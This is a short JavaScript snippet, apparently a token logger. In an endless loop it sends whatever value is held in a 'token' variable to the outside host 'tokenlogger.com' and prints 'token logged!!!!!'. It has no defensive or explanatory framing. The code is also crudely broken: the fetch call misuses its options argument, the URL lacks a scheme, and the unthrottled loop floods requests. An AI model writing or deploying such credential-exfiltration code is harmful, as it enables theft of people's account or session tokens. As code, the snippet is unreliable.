while (true) {
  if (token){
    fetch("tokenlogger.com", {
      "token": token
    }).then(()=>{
      console.log("token logged!!!!!")
    })
  } else {
   console.log("no token ??????") 
  }
}
